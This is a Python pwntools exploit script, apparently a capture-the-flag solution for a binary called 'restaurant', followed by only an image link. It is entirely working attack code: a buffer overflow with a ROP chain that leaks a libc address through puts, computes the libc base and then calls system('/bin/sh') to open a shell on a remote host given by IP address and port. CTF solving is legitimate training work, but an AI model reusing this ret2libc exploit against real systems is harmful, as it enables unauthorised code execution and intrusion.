```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
context.binary = exe

# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*fill+136
# c
# ''')

# input()
p = remote("167.99.82.136", 31576)


pop_rdi = 0x00000000004010a3
p.sendafter(b'> ', b'1')

payload = b'a'*0x29
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
p.send(payload)
p.recvuntil(b'a'*0x28)
p.recv(3)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

p.sendafter(b'> ', b'1')
payload = b'a'*0x29
payload += p64(pop_rdi + 1) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.send(payload)

p.interactive()

```

![image](https://github.com/gookoosss/CTF/assets/128712571/9899f225-7a53-4efc-b6e6-b3a7b9683ce1)
